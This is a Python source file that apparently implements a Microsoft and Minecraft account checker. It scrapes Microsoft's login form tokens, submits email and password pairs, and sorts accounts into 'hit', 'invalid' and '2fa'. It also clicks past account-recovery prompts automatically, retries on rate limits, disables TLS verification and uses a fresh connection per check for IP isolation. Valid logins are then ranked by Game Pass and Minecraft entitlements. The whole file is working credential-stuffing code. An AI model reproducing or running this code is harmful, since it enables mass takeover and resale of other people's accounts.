import re
import urllib.parse
import json
from typing import Optional, Dict, Tuple
import httpx

MS_OAUTH_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch"
    "&response_type=token"
    "&locale=en"
)


def _extract_ppft(text: str) -> Optional[str]:
    # Strategy 1: JSON sFTTag property
    pos = text.find('"sFTTag":"')
    if pos != -1:
        after = text[pos:]
        vp = after.find(r'value=\"')
        if vp != -1:
            start = vp + len(r'value=\"')
            part = after[start:]
            end = part.find(r'\"')
            if end != -1:
                tok = part[:end]
                if tok:
                    return tok
    # Strategy 2: plain HTML input
    m = re.search(r'name="PPFT"[^>]+value="([^"]+)"', text)
    if m:
        return m.group(1)
    m2 = re.search(r'value="([^"]+)"[^>]+name="PPFT"', text)
    if m2:
        return m2.group(1)
    return None


def _extract_url_post(text: str) -> Optional[str]:
    m = re.search(r"urlPost:'([^']+)'", text)
    if m:
        return m.group(1)
    m2 = re.search(r'"urlPost":"([^"]+)"', text)
    if m2:
        return m2.group(1)
    return None


def _extract_access_token_from_url(url: str) -> Optional[str]:
    if "#" in url:
        fragment = url[url.find("#") + 1:]
    else:
        parsed = urllib.parse.urlparse(url)
        fragment = parsed.fragment or ""
    qs = urllib.parse.parse_qs(fragment)
    toks = qs.get("access_token")
    if toks and toks[0]:
        return toks[0]
    return None


def _extract_fmhf_form(body: str) -> Optional[Tuple[str, list]]:
    m = re.search(r'(?s)<form[^>]+id="fmHF"[^>]*>', body)
    if not m:
        return None
    form_tag = m.group(0)
    am = re.search(r'action="([^"]+)"', form_tag)
    if not am:
        return None
    action = am.group(1).replace("&amp;", "&")
    inputs = []
    for tag in re.findall(r'(?i)<input[^>]+type=["\']hidden["\'][^>]*/?>', body):
        nm = re.search(r'(?i)\bname=["\']([^"\']*)["\']', tag)
        vm = re.search(r'(?i)\bvalue=["\']([^"\']*)["\']', tag)
        if nm:
            inputs.append((nm.group(1), vm.group(1) if vm else ""))
    return action, inputs


def _extract_recovery_return_url(text: str) -> Optional[str]:
    for marker in ('"recoveryCancel":{"returnUrl":"', r'\"recoveryCancel\":{\"returnUrl\":\"'):
        pos = text.find(marker)
        if pos != -1:
            tail = text[pos + len(marker):]
            end = tail.find('"')
            if end != -1:
                url = tail[:end].rstrip("\\")
                if url:
                    return url
    return None


async def _skip_recovery_flow(client: httpx.AsyncClient, body: str) -> Optional[str]:
    for _ in range(3):
        form = _extract_fmhf_form(body)
        if not form:
            return None
        action, inputs = form
        data = {k: v for k, v in inputs}
        resp = await client.post(action, data=data, follow_redirects=False)
        loc = resp.headers.get("location")
        if loc:
            tok = _extract_access_token_from_url(loc)
            if tok:
                return tok
        next_body = resp.text
        raw_url = _extract_recovery_return_url(next_body)
        if raw_url:
            return_url = raw_url.replace("\\u0026", "&").replace("\\/", "/").replace("&amp;", "&")
            fin = await client.get(return_url, follow_redirects=False)
            tok = _extract_access_token_from_url(str(fin.url))
            if tok:
                return tok
        if 'id="fmHF"' in next_body:
            body = next_body
            continue
        return None
    return None


async def _get_ms_token(client: httpx.AsyncClient, email: str, password: str) -> Tuple[str, Optional[str]]:
    """Returns (status, token_or_reason). Status: success, 2fa, invalid, error"""
    for attempt in range(3):
        try:
            # Step 1: GET auth page
            resp = await client.get(MS_OAUTH_URL, follow_redirects=False)
            text = resp.text
            ppft = _extract_ppft(text)
            url_post = _extract_url_post(text)
            if not ppft or not url_post:
                return ("error", "ppft_not_found")

            # Step 2: POST credentials
            data = {
                "login": email,
                "loginfmt": email,
                "passwd": password,
                "PPFT": ppft,
            }
            resp2 = await client.post(
                url_post,
                data=data,
                follow_redirects=False,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            )
            status = resp2.status_code

            if status == 429:
                await __import__("asyncio").sleep(1 << attempt)
                continue

            # Check Location header for token / 2FA
            loc = resp2.headers.get("location", "")
            if loc:
                if "#" in loc:
                    tok = _extract_access_token_from_url(loc)
                    if tok:
                        return ("success", tok)
                if "identity/confirm" in loc or "Email/Confirm" in loc or "/Abuse?mkt" in loc or "recover?mkt" in loc:
                    return ("2fa", None)

            body = resp2.text
            if "recover?mkt" in body or "account.live.com/identity/confirm?mkt" in body or "Email/Confirm?mkt" in body or "/Abuse?mkt=" in body:
                return ("2fa", None)

            # Recovery / relay interstitial
            if 'id="fmHF"' in body and ("cancel?mkt=" in body or "/ar/cancel?" in body or 'action="https://account.live.com/' in body or "<title>Continue</title>" in body or "DoSubmit()" in body):
                tok = await _skip_recovery_flow(client, body)
                if tok:
                    return ("success", tok)

            bl = body.lower()
            if "password is incorrect" in bl or "account doesn't exist" in bl or "sign in to your microsoft account" in bl or "tried to sign in too many times" in bl:
                return ("invalid", None)

            return ("error", f"unmatched_status_{status}")
        except Exception as e:
            if attempt < 2:
                await __import__("asyncio").sleep(0.5)
            else:
                return ("error", str(e))
    return ("error", "max_retries")


async def check_account(email: str, password: str) -> Dict:
    """
    Full MS → Xbox → XSTS → MC pipeline.
    Returns dict with keys: status, result_type, details
    """
    # Independent client per check for IP isolation (no connection reuse)
    transport = httpx.AsyncHTTPTransport(retries=0)
    async with httpx.AsyncClient(
        follow_redirects=False,
        timeout=httpx.Timeout(15.0, connect=5.0),
        verify=False,
        transport=transport,
    ) as client:
        ms_status, ms_token = await _get_ms_token(client, email, password)
        if ms_status == "2fa":
            return {"status": "2fa", "result_type": "2fa", "details": ""}
        if ms_status == "invalid":
            return {"status": "invalid", "result_type": "invalid", "details": ""}
        if ms_status != "success":
            return {"status": "error", "result_type": "error", "details": ms_token or "ms_auth_failed"}

        try:
            # Xbox Live auth
            xbox_payload = {
                "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT",
            }
            r = await client.post(
                "https://user.auth.xboxlive.com/user/authenticate",
                json=xbox_payload,
                headers={"Content-Type": "application/json", "Accept": "application/json"},
            )
            if r.status_code != 200:
                return {"status": "error", "result_type": "error", "details": f"xbox_auth_{r.status_code}"}
            js = r.json()
            xbox_token = js.get("Token")
            uhs = js.get("DisplayClaims", {}).get("xui", [{}])[0].get("uhs")
            if not xbox_token or not uhs:
                return {"status": "error", "result_type": "error", "details": "xbox_token_missing"}

            # XSTS
            xsts_payload = {
                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                "RelyingParty": "rp://api.minecraftservices.com/",
                "TokenType": "JWT",
            }
            r2 = await client.post(
                "https://xsts.auth.xboxlive.com/xsts/authorize",
                json=xsts_payload,
                headers={"Content-Type": "application/json", "Accept": "application/json"},
            )
            if r2.status_code != 200:
                return {"status": "error", "result_type": "error", "details": f"xsts_{r2.status_code}"}
            xsts_token = r2.json().get("Token")
            if not xsts_token:
                return {"status": "error", "result_type": "error", "details": "xsts_token_missing"}

            # Minecraft token
            identity = f"XBL3.0 x={uhs};{xsts_token}"
            for attempt in range(3):
                r3 = await client.post(
                    "https://api.minecraftservices.com/authentication/login_with_xbox",
                    json={"identityToken": identity},
                    headers={"Content-Type": "application/json"},
                )
                if r3.status_code == 200:
                    mc_token = r3.json().get("access_token")
                    if mc_token:
                        break
                elif r3.status_code == 429:
                    await __import__("asyncio").sleep(1 << attempt)
                else:
                    return {"status": "error", "result_type": "error", "details": f"mc_token_{r3.status_code}"}
            else:
                return {"status": "error", "result_type": "error", "details": "mc_token_exhausted"}

            # Profile + Entitlements concurrently
            import asyncio
            prof_task = asyncio.create_task(
                client.get(
                    "https://api.minecraftservices.com/minecraft/profile",
                    headers={"Authorization": f"Bearer {mc_token}"},
                )
            )
            ent_task = asyncio.create_task(
                client.get(
                    "https://api.minecraftservices.com/entitlements/mcstore",
                    headers={"Authorization": f"Bearer {mc_token}"},
                )
            )
            prof_resp, ent_resp = await asyncio.gather(prof_task, ent_task)

            profile = None
            if prof_resp.status_code == 200:
                pjs = prof_resp.json()
                capes = ", ".join(c.get("alias", "") for c in pjs.get("capes", []))
                profile = {
                    "name": pjs.get("name", "N/A"),
                    "uuid": pjs.get("id", "N/A"),
                    "capes": capes,
                }

            acc_type = "Unknown"
            has_java = False
            if profile and profile["name"] != "N/A":
                has_java = True

            if ent_resp.status_code == 200:
                ejs = ent_resp.json()
                items = [it.get("name", "") for it in ejs.get("items", [])]
                if has_java and "product_minecraft" not in items:
                    items.append("product_minecraft")
                if "product_game_pass_ultimate" in items:
                    return {
                        "status": "hit", "result_type": "xgpu",
                        "details": json.dumps({"profile": profile, "type": "Xbox Game Pass Ultimate", "items": items})
                    }
                if any(i in items for i in ("product_game_pass_pc", "product_game_pass")):
                    return {
                        "status": "hit", "result_type": "xgp",
                        "details": json.dumps({"profile": profile, "type": "Xbox Game Pass", "items": items})
                    }
                if "product_minecraft" in items or has_java:
                    return {
                        "status": "hit", "result_type": "hit",
                        "details": json.dumps({"profile": profile, "type": "Normal", "items": items})
                    }
                other = []
                if "product_minecraft_bedrock" in items:
                    other.append("Minecraft Bedrock")
                if "product_legends" in items:
                    other.append("Minecraft Legends")
                if "product_dungeons" in items:
                    other.append("Minecraft Dungeons")
                if other:
                    return {
                        "status": "hit", "result_type": "other",
                        "details": json.dumps({"profile": profile, "type": f"Other: {', '.join(other)}", "items": items})
                    }
                return {
                    "status": "hit", "result_type": "vm",
                    "details": json.dumps({"profile": profile, "type": "No Minecraft Products", "items": items})
                }

            # Entitlements failed but we have profile
            if has_java:
                return {
                    "status": "hit", "result_type": "hit",
                    "details": json.dumps({"profile": profile, "type": "Normal", "items": []})
                }
            return {"status": "error", "result_type": "error", "details": "entitlements_failed"}

        except Exception as e:
            return {"status": "error", "result_type": "error", "details": str(e)}
